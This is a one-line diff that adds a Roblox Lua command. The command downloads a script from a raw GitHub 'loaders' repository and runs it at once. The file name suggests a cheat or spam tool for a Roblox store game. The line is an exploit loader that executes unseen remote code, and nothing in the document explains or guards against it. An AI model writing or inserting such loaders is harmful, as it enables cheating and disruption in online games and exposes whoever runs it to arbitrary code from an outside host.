@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LeopardEquip39/loaders/main/loaders/run-a-sari-sari-store-spam7-b0hihgo4hz7lji.lua"))()
